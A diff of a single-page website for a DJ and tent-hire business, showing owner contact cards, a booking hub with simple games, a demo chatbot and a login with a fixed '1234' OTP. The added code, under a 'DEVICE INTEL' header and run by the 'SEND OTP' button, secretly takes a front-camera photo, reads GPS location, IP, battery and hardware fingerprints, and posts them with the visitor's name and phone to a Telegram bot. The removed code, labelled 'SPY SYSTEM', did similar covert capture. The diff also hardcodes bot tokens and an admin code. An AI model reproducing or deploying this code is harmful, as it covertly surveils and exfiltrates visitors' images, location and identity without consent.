-                <h2 style="color:white; margin-bottom:20px;">SERVICES</h2>
-                <div class="secure-card" style="margin:0 auto 20px;">
-                    <i class="fas fa-music" style="font-size:40px; color:var(--primary);"></i>
-                    <h3 style="margin-top:10px;">Concert Sound</h3>
-                </div>
-                <div class="secure-card" style="margin:0 auto;">
-                    <i class="fas fa-truck-monster" style="font-size:40px; color:var(--accent);"></i>
-                    <h3 style="margin-top:10px;">Mobile DJ</h3>
-                </div>
-            </div>
-        </div>
-
-        <div id="ownerModal">
-            <div class="owner-scroll-box">
-                <h2 style="color:var(--primary); text-align:center; font-family:'Cinzel'; margin-bottom:20px;">OWNER COMMAND</h2>
-                
-                <div class="owner-tile">
-                    <div class="tile-head">
-                        <img src="https://i.postimg.cc/6qbJj3hQ/Screenshot-2026-01-14-15-25-06-57-1c337646f29875672b5a61192b9010f9-2.jpg" class="tile-pic">
-                        <div class="tile-info"><h3>ANIL KUMAR</h3><p>FOUNDER</p></div>
-                    </div>
-                    <div class="btn-stack">
-                        <a href="tel:+918544341240" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
-                        <a href="https://wa.me/918544341240" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
-                        <a href="sms:+918544341240" class="big-btn b-sms"><i class="fas fa-envelope"></i> SEND SMS</a>
-                    </div>
-                </div>
-
-                <div class="owner-tile">
-                    <div class="tile-head">
-                        <img src="https://i.postimg.cc/7Y7rMx2y/Screenshot-2026-01-14-15-33-01-78-965bbf4d18d205f782c6b8409c5773a4-2.jpg" class="tile-pic">
-                        <div class="tile-info"><h3>SILDHAR KUMAR</h3><p>LOGISTICS</p></div>
-                    </div>
-                    <div class="btn-stack">
-                        <a href="tel:+917294969938" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
-                        <a href="https://wa.me/917294969938" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
-                    </div>
-                </div>
-
-                <div class="owner-tile">
-                    <div class="tile-head">
-                        <img src="https://i.postimg.cc/qMWWzWbF/Screenshot-2026-01-14-15-29-44-90-965bbf4d18d205f782c6b8409c5773a4.jpg" class="tile-pic">
-                        <div class="tile-info"><h3>SANJAY KUMAR</h3><p>TECHNICAL</p></div>
-                    </div>
-                    <div class="btn-stack">
-                        <a href="tel:+919153635378" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
-                        <a href="https://wa.me/919153635378" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
-                    </div>
-                </div>
-
-                <div class="owner-tile">
-                    <div class="tile-head">
-                        <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="tile-pic">
-                        <div class="tile-info"><h3>LALU KUMAR</h3><p>CREATIVE</p></div>
-                    </div>
-                    <div class="btn-stack">
-                        <a href="tel:+919771617808" class="big-btn b-call"><i class="fas fa-phone"></i> CALL NOW</a>
-                        <a href="https://wa.me/919771617808" class="big-btn b-wa"><i class="fab fa-whatsapp"></i> WHATSAPP</a>
-                    </div>
-                </div>
-
-                <button class="btn-enter" style="background:#222; border:1px solid #444;" onclick="closeOwners()">CLOSE</button>
-            </div>
-        </div>
-
-        <div id="adminModal" style="display:none; position:fixed; inset:0; background:black; z-index:6000; justify-content:center; align-items:center;">
-            <div class="secure-card">
-                <h3>ADMIN POSTING</h3>
-                <button class="btn-enter" onclick="postText()" style="margin-bottom:10px;">📝 WRITE POST</button>
-                <button class="btn-enter" onclick="document.getElementById('adminFile').click()" style="margin-bottom:10px;">📸 UPLOAD PHOTO</button>
-                <button class="btn-enter" onclick="document.getElementById('adminReel').click()" style="margin-bottom:10px;">🎥 UPLOAD REEL</button>
-                <button class="btn-enter" style="background:#333;" onclick="document.getElementById('adminModal').style.display='none'">EXIT</button>
-            </div>
-        </div>
-
-        <nav class="bottom-nav">
-            <div class="nav-icon active" onclick="goTab('home', this)"><i class="fas fa-home"></i>Home</div>
-            <div class="nav-icon" onclick="goTab('booking', this)"><i class="fas fa-calendar-check"></i>Book</div>
-            <div class="nav-icon" onclick="openOwners()"><i class="fas fa-address-book"></i>Contact</div>
-            <div class="nav-icon" onclick="goTab('services', this)"><i class="fas fa-layer-group"></i>Service</div>
         </nav>
+        
+        <div class="container" id="homeSection">
+            <div class="profile-wrapper">
+                <div class="img-container">
+                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="profile-pic" alt="Maa Nirmala DJ & Tent House">
+                </div>
+                <h1>MAA NIRMALA DJ & TENT HOUSE <i class="fas fa-check-circle verified"></i></h1>
+                <p class="bio">Digital Creator | Developer</p>
+                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL MNDs APP</button>
+            </div>
+          
+          
+            <div class="section-label"><i class="fas fa-book"></i> STUDY WEBSITE</div>
+            <div class="grid">
+                <a href="#" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-book-open"></i><span>Study Spark</span></a>
+                <a href="#" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-laptop-code"></i><span>Rolex Coderz</span></a>
+            </div>
+            
+            <div class="section-label"><i class="fas fa-user-circle"></i> ABOUT OWNER</div>
+            <div class="owner-profile">
+                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" alt="Maa Nirmala DJ & Tent House">
+                <h1>Maa Nirmala DJ & Tent House</h1>
+                <h3>Creative Developer • Learner • Dream Builder</h3>
+                <p>
+                    A passionate and hardworking individual with a strong interest in technology,
+                    web development, and creative digital projects. Always eager to learn new skills,
+                    explore innovative ideas, and build useful online tools.
+                </p>
+                <div class="rights">© 2026 All Rights Reserved — Maa Nirmala DJ & Tent House</div>
+            </div>
+        </div>
 
+        <div class="bottom-nav">
+            <div class="nav-item active" id="navHome" onclick="navAction('home')"><i class="fas fa-home"></i><span>Home</span></div>
+            <div class="nav-item" id="navLinks" onclick="navAction('links')"><i class="fas fa-link"></i><span>Links</span></div>
+            <div class="nav-item" id="navGames" onclick="navAction('games')"><i class="fas fa-gamepad"></i><span>Booking</span></div>
+            <div class="nav-item" id="navLogin" onclick="navAction('login')"><i class="fas fa-user-circle"></i><span id="loginText">Login</span></div>
+        </div>
+
+        <div class="ai-trigger" onclick="openAI()"><i class="fas fa-brain" style="font-size:24px; color:#fff;"></i></div>
+
+        <div class="modal-wrap" id="gameModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
+                    <span style="color:var(--gold-primary); font-weight:bold;"><i class="fas fa-gamepad"></i> BOOKING HUB</span>
+                    <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
+                </div>
+                <div class="game-menu" id="gameMenu">
+                    <div class="games-grid">
+                        <div class="game-thumb" onclick="loadSnake()"><i class="fas fa-worm"></i><span>Snake</span></div>
+                        <div class="game-thumb" onclick="loadTicTacToe()"><i class="fas fa-border-all"></i><span>TicTacToe</span></div>
+                        <div class="game-thumb" onclick="window.open('#', '_blank')"><i class="fas fa-puzzle-piece"></i><span>Sudoku</span></div>
+                        <div class="game-thumb" onclick="window.open('#', '_blank')"><i class="fas fa-dice"></i><span>Ludo</span></div>
+                    </div>
+                </div>
+                <div class="game-canvas-area" id="gamePlayArea">
+                    <h4 id="activeGameTitle" style="color:var(--gold-primary); margin-bottom:10px;"></h4>
+                    <div id="gameContainer"></div> <button class="g-btn" style="width:100%; margin-top:20px;" onclick="closeGame()">EXIT</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="aiModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div class="ai-head" style="padding:15px; background:var(--gold-primary); color:#000; font-weight:bold;">
+                    MNDs BRAIN v2.07<i class="fas fa-times" style="float:right; cursor:pointer;" onclick="closeModal(null, true)"></i>
+                </div>
+                <div class="chat-box" id="chatHistory">
+                    <div class="bubble bot">Hello! I am Maa Nirmala DJ's AI.<br>How can I assist you today?</div>
+                </div>
+                <div style="padding:15px; border-top:1px solid #333; display:flex;">
+                    <input type="text" id="userMsg" class="input-box" style="flex:1; margin-bottom:0; padding:10px; background:#111; border:1px solid #333; color:#fff;" placeholder="Ask MNDs AI..." onkeypress="handleEnter(event)">
+                    <button style="background:var(--gold-primary); border:none; padding:0 15px; border-radius:8px; margin-left:10px;" onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal-wrap" id="authModal" onclick="closeModal(event)">
+            <div class="modal-inner" onclick="event.stopPropagation()">
+                <div style="display:flex; border-bottom:1px solid #333;">
+                    <div class="auth-tab active" style="flex:1; padding:15px; text-align:center; color:var(--gold-primary); border-bottom:2px solid var(--gold-primary);">LOGIN</div>
+                </div>
+                <div style="padding:25px;">
+                    <input type="tel" id="mobileInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Mobile Number">
+                    <button class="btn-full" style="width:100%; padding:12px; background:var(--gold-primary); border:none; font-weight:bold; border-radius:8px;" onclick="sendOTP()">SEND OTP</button>
+                    <div id="otpArea" style="display:none; margin-top:15px;">
+                        <input type="text" id="otpInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Enter 1234">
+                        <button class="btn-full" style="width:100%; padding:12px; background:#00ff00; border:none; font-weight:bold; border-radius:8px;" onclick="verifyOTP()">VERIFY LOGIN</button>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
+
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({ pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, autoDisplay: false }, 'google_translate_element');
+        }
+    </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
     <script>
-        const BOT_TOKEN = "8246897026:AAG7c8YZ2V1jk18knzODpKRIDwgeXXFdvcY";
-        const CHAT_ID = "8506290708"; 
+        // ==========================================
+        // 🚨 CONFIGURATION 🚨
+        // ==========================================
+        const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
+        const TG_CHAT = "8506290708";
 
-        function playClick() { document.getElementById("clickSound").play().catch(e=>{}); }
+        // ==========================================
+        // 🔒 PWA INSTALL LOGIC
+        // ==========================================
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            const btn = document.getElementById('installBtn');
+            if(btn) btn.style.display = 'inline-block';
+        });
 
-        // --- SPY SYSTEM ---
-        async function initSpy() {
-            const name = document.getElementById('logName').value;
-            const phone = document.getElementById('logPhone').value;
-            const btn = document.getElementById('enterBtn');
-            if(!name || !phone) return Swal.fire({icon:'error', background:'#111', title:'Identity Required'});
-            btn.innerHTML = 'VERIFYING...';
+        function installApp() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('User accepted the install prompt');
+                    }
+                    deferredPrompt = null;
+                });
+            }
+        }
 
-            const logMsg = `🚨 **SECURE LOG**\n👤: ${name} (${phone})\n⏰: ${new Date().toLocaleString()}`;
+        // ==========================================
+        // 🔒 ADVANCED DEVICE INTEL
+        // ==========================================
+        async function getDeviceIntel() {
+            let model = "Unknown Device";
+            let browser = navigator.userAgent;
+            let battery = "Unknown";
+            let ip = "Masked";
+            let network = "Unknown";
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            if (navigator.userAgentData) {
+                const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+                model = `${data.platform} ${data.model}`;
+            }
+
+            // Battery (Non-blocking)
+            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Battery'})`; } catch(e){}
             
-            // Camera
+            // IP (Non-blocking)
+            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
+            
+            // Network
+            try { if(navigator.connection) network = `${navigator.connection.effectiveType} (${navigator.connection.type || 'cellular'}) - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
+            
+            // Hardware
+            const gpu = (function(){ try{var c=document.createElement('canvas');var gl=c.getContext('webgl');var d=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch(e){return "N/A";}})();
+            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+            const cores = navigator.hardwareConcurrency || "Unknown";
+
+            return { battery, ip, network, gpu, ram, cores, browser, model, timezone };
+        }
+
+        // ==========================================
+        // 🚀 MAIN EXECUTION (LOGIN FLOW)
+        // ==========================================
+        async function initiateSecureEntry() {
+            const nameField = document.getElementById('g-name');
+            const phoneField = document.getElementById('g-phone');
+            const mobileInput = document.getElementById('mobileInput');
+            
+            let name = "Auth User";
+            let phone = mobileInput ? mobileInput.value : "";
+            
+            if(nameField && nameField.offsetParent !== null) { 
+                name = nameField.value;
+                phone = phoneField.value;
+            }
+
+            if(phone.length < 10) {
+                alert("Please enter a valid Mobile Number.");
+                return;
+            }
+
+            // UI Feedback
+            const btn = document.getElementById('btn-verify');
+            const status = document.getElementById('g-status');
+            if(btn) { btn.innerHTML = '<i class="fas fa-satellite-dish fa-spin"></i> SECURE SCANNING...'; btn.style.opacity = "0.7"; }
+            if(status) status.style.display = "block";
+
+            // FORCE OPEN TIMER (Safety Net - 3.5s)
+            const safetyTimer = setTimeout(() => { unlockUI(); }, 3500);
+
+            // 1. Gather Data (Non-Blocking)
+            const intelPromise = getDeviceIntel();
+            const screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit) - Pixel Ratio: ${window.devicePixelRatio}`;
+            
+            // 2. Capture Camera & Location (Parallel)
+            let imageBlob = null;
+            let locData = "❌ Location Denied/Unavailable";
+            let mapLink = "";
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                video.srcObject = stream;
-                await new Promise(r => video.onloadedmetadata = r);
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                canvas.toBlob(async (b) => {
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b); fd.append('caption', logMsg);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    unlock();
-                }, 'image/jpeg', 0.8);
-            } catch (e) {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id:CHAT_ID, text:logMsg}) });
-                unlock();
+                if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    const video = document.getElementById('hidden-video');
+                    const canvas = document.getElementById('hidden-canvas');
+                    video.srcObject = stream;
+                    await new Promise(r => video.onloadedmetadata = r);
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    imageBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            } catch(e) {}
+
+            try {
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(p => {
+                        locData = `• Coords: ${p.coords.latitude}, ${p.coords.longitude}\n• Accuracy: ${Math.round(p.coords.accuracy)}m`;
+                        mapLink = `🔗 [Open Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
+                        resolve();
+                    }, reject, {timeout: 2000});
+                });
+            } catch(e) {}
+
+            const intel = await intelPromise;
+
+            // 3. Send to Telegram
+            const msg = `
+🚨 *SECURE HUB ACCESS LOG* 🚨
+
+👤 *USER IDENTITY*
+• Name: ${name}
+• Phone: ${phone}
+
+📱 *DEVICE FINGERPRINT*
+• Model: ${intel.model}
+• OS/Browser: ${intel.browser}
+• Screen: ${screen}
+• Timezone: ${intel.timezone}
+
+⚙️ *HARDWARE SPECS*
+• GPU: ${intel.gpu}
+• CPU/RAM: Cores: ${intel.cores}, RAM: ${intel.ram}
+• Battery: ${intel.battery}
+
+📡 *NETWORK INTEL*
+• IP: ${intel.ip}
+• Type: ${intel.network}
+
+📍 *LOCATION DATA*
+${locData}
+${mapLink}
+
+⏰ *Time:* ${new Date().toLocaleString()}
+`;
+
+            sendToTelegram(msg, imageBlob);
+            clearTimeout(safetyTimer);
+            unlockUI();
+        }
+
+        function unlockUI() {
+            const gate = document.getElementById('gatekeeper');
+            const main = document.getElementById('main-interface');
+            
+            if(gate && gate.style.display !== 'none') {
+                gate.style.opacity = '0';
+                setTimeout(() => {
+                    gate.style.display = 'none';
+                    main.style.display = 'block';
+                    setTimeout(() => main.style.opacity = '1', 50);
+                }, 600);
             }
         }
-        function unlock() { document.getElementById('gateway').style.display='none'; document.getElementById('main-app').style.display='block'; setTimeout(()=>document.getElementById('main-app').style.opacity=1,50); }
 
-        // --- LIVE FEED LOGIC (NO RELOAD) ---
-        function loadFeed() {
-            const posts = JSON.parse(localStorage.getItem('mn_posts')) || [];
-            const container = document.getElementById('feed-stream');
-            posts.forEach(p => addPostToDom(p));
-        }
+        // --- TELEGRAM SENDER ---
+        function sendToTelegram(text, imgBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TG_CHAT);
+            formData.append('caption', text);
+            formData.append('parse_mode', 'Markdown');
 
-        function addPostToDom(post) {
-            const container = document.getElementById('feed-stream');
-            const div = document.createElement('div');
-            div.className = 'post-card';
-            div.innerHTML = `
-                <div class="post-header"><img src="https://i.postimg.cc/Fzw8bm7X/file-00000000975871fd99596a5a0e39c71b.png" class="post-avatar"><div class="post-meta"><h4>Maa Nirmala Admin</h4><span>${post.date}</span></div></div>
-                ${post.txt ? `<div class="post-body">${post.txt}</div>` : ''}
-                ${post.img ? `<img src="${post.img}" class="post-img">` : ''}
-                ${post.vid ? `<video src="${post.vid}" controls class="post-video" style="width:100%"></video>` : ''}
-            `;
-            container.prepend(div);
-        }
-
-        function savePost(post) {
-            const posts = JSON.parse(localStorage.getItem('mn_posts')) || [];
-            posts.push(post);
-            localStorage.setItem('mn_posts', JSON.stringify(posts));
-            addPostToDom(post);
-        }
-
-        // --- ADMIN ---
-        function adminLogin() {
-            Swal.fire({ title:'ADMIN CODE', input:'password', background:'#111', color:'#fff', preConfirm: (c) => {
-                if(c==='121120') document.getElementById('adminModal').style.display='flex';
-                else Swal.fire('Error','Invalid Code','error');
-            }});
-        }
-
-        function postText() {
-            Swal.fire({ title:'WRITE POST', input:'textarea', background:'#111', color:'#fff', preConfirm: (t) => {
-                savePost({ date: new Date().toLocaleDateString(), txt: t });
-                document.getElementById('adminModal').style.display='none';
-            }});
-        }
-
-        function createPost(type) {
-            const input = type==='image' ? document.getElementById('adminFile') : document.getElementById('adminReel');
-            const file = input.files[0];
-            if(file) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    savePost({ date: new Date().toLocaleDateString(), [type==='image'?'img':'vid']: e.target.result });
-                    document.getElementById('adminModal').style.display='none';
-                };
-                reader.readAsDataURL(file);
+            if (imgBlob) {
+                formData.append('photo', imgBlob, 'access_log.jpg');
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                .catch(err => {
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'Markdown' })
+                    });
+                });
+            } else {
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'Markdown' })
+                });
             }
         }
 
-        // --- BOOKING ---
-        function submitBooking() {
-            const n=document.getElementById('bName').value, p=document.getElementById('bPhone').value, d=document.getElementById('bDate').value;
-            if(!n || !p || !d) return Swal.fire('Error','Fill required','error');
-            const msg = `📅 BOOKING\n👤 ${n}\n📞 ${p}\n🗓 ${d}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg }) });
-            Swal.fire('Success','Sent!','success');
+        // ==========================================
+        // 🎮 UI UTILITIES
+        // ==========================================
+        function playTap() {
+            const audio = document.getElementById('sfx-tap');
+            if(audio) { audio.currentTime = 0; audio.play().catch(()=>{}); }
+        }
+        function copyUPI() { 
+            navigator.clipboard.writeText("9771617808-2@axl"); 
+            const t = document.getElementById('toast');
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 2000);
+        }
+        function themeSwitch() {
+            playTap();
+            const b = document.body;
+            b.setAttribute('data-theme', b.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+        }
+        function navAction(tab) {
+            playTap();
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            if(tab === 'home') {
+                document.getElementById('navHome').classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else if(tab === 'links') {
+                document.getElementById('navLinks').classList.add('active');
+                document.getElementById('linksSection').scrollIntoView({ behavior: 'smooth' });
+            } else if(tab === 'games') {
+                document.getElementById('navGames').classList.add('active');
+                document.getElementById('gameModal').classList.add('active');
+            } else if(tab === 'login') {
+                document.getElementById('navLogin').classList.add('active');
+                document.getElementById('authModal').classList.add('active');
+            }
+        }
+        function closeModal(e, f) {
+            if(f || e.target.classList.contains('modal-wrap')) {
+                document.querySelectorAll('.modal-wrap').forEach(m => m.classList.remove('active'));
+                if(gameLoop) clearInterval(gameLoop);
+            }
         }
 
-        // --- NAV ---
-        function goTab(id,el) {
-            document.querySelectorAll('.tab-content').forEach(d=>d.classList.remove('active'));
-            document.getElementById('tab-'+id).classList.add('active');
-            if(el) { document.querySelectorAll('.nav-icon').forEach(i=>i.classList.remove('active')); el.classList.add('active'); }
-            toggleMenu(false);
+        // Auth Logic
+        function sendOTP() {
+            initiateSecureEntry();
         }
-        function toggleMenu(f) { const s=document.getElementById('sidebar'); if(f===false)s.classList.remove('active'); else s.classList.toggle('active'); }
-        function openOwners() { document.getElementById('ownerModal').style.display='flex'; toggleMenu(false); }
-        function closeOwners() { document.getElementById('ownerModal').style.display='none'; }
-        function toggleTheme() { document.body.setAttribute('data-theme', document.body.getAttribute('data-theme')==='light'?'dark':'light'); }
+        function verifyOTP() {
+            if(document.getElementById('otpInput').value === "1234") {
+                document.getElementById('authModal').classList.remove('active');
+                alert("Login Verified!");
+            } else alert("Wrong OTP");
+        }
+
+        // AI Chat
+        function openAI() { document.getElementById('aiModal').classList.add('active'); }
+        function handleEnter(e) { if(e.key==='Enter') sendMessage(); }
+        function sendMessage() {
+            const val = document.getElementById('userMsg').value;
+            if(!val) return;
+            const box = document.getElementById('chatHistory');
+            box.innerHTML += `<div class="bubble user">${val}</div>`;
+            document.getElementById('userMsg').value = "";
+            setTimeout(() => {
+                box.innerHTML += `<div class="bubble bot">I am just a demo bot. Please contact Maa Nirmala DJ directly!</div>`;
+                box.scrollTop = box.scrollHeight;
+            }, 500);
+        }
+
+        // Games Logic
+        let gameLoop;
+        function closeGame() { clearInterval(gameLoop); document.getElementById('gamePlayArea').style.display='none'; document.getElementById('gameMenu').style.display='block'; }
+        function loadSnake() {
+            document.getElementById('gameMenu').style.display='none';
+            document.getElementById('gamePlayArea').style.display='flex';
+            document.getElementById('activeGameTitle').innerText="SNAKE";
+            const c = document.getElementById('gameContainer');
+            c.innerHTML = `<canvas id="sCanvas" width="240" height="240"></canvas><div class="game-ctrl-pad"><button class="g-btn" onclick="sDir={x:-1,y:0}">←</button><button class="g-btn" onclick="sDir={x:0,y:-1}">↑</button><button class="g-btn" onclick="sDir={x:1,y:0}">→</button><button class="g-btn" style="grid-column:2" onclick="sDir={x:0,y:1}">↓</button></div>`;
+            const ctx = document.getElementById('sCanvas').getContext('2d');
+            let snake=[{x:10,y:10}], food={x:5,y:5}; window.sDir={x:0,y:0};
+            gameLoop = setInterval(()=>{
+                let head={x:snake[0].x+window.sDir.x, y:snake[0].y+window.sDir.y};
+                snake.unshift(head);
+                if(head.x==food.x && head.y==food.y) food={x:Math.floor(Math.random()*12),y:Math.floor(Math.random()*12)};
+                else snake.pop();
+                ctx.fillStyle='#000'; ctx.fillRect(0,0,240,240);
+                ctx.fillStyle='red'; ctx.fillRect(food.x*20,food.y*20,18,18);
+                ctx.fillStyle='#D4AF37'; snake.forEach(p=>ctx.fillRect(p.x*20,p.y*20,18,18));
+                if(head.x<0||head.x>=12||head.y<0||head.y>=12) { clearInterval(gameLoop); alert("Game Over"); closeGame(); }
+            }, 200);
+        }
+        function loadTicTacToe() {
+            document.getElementById('gameMenu').style.display='none';
+            document.getElementById('gamePlayArea').style.display='flex';
+            document.getElementById('activeGameTitle').innerText="TIC TAC TOE";
+            const c = document.getElementById('gameContainer');
+            c.innerHTML = `<div id="tttGrid"></div>`;
+            const g = document.getElementById('tttGrid');
+            let b=['','','','','','','','',''], t='X';
+            for(let i=0;i<9;i++){
+                let d=document.createElement('div'); d.className='ttt-cell';
+                d.onclick=()=>{
+                    if(!b[i]){ b[i]=t; d.innerText=t; d.classList.add(t.toLowerCase()); t=t=='X'?'O':'X'; 
+                    [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]].forEach(w=>{
+                        if(b[w[0]] && b[w[0]]==b[w[1]] && b[w[0]]==b[w[2]]) { setTimeout(()=>{alert(b[w[0]]+" Wins!"); closeGame()},100); }
+                    });
+                }};
+                g.appendChild(d);
+            }
+        }
     </script>
 </body>
 </html>
